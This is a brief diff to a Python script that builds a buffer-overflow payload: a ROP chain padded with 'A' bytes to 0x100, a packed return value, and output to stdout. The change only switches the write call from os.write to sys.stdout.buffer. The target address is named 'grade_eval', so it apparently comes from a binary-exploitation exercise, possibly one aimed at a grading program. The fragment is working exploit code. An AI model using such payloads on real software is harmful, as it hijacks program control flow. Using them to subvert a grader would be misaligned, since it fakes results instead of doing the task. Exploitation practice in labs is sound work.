@@ -1,4 +1,4 @@
-import os
+import sys
 import struct
 
 grade_eval  = 0x401677
@@ -14,4 +14,5 @@ payload = rop_chain.ljust(0x100, b'A')
 payload += struct.pack('<Q', 0xa8)
 payload += b'\n'
 
-os.write(1, payload)
+sys.stdout.buffer.write(payload)
+sys.stdout.buffer.flush()
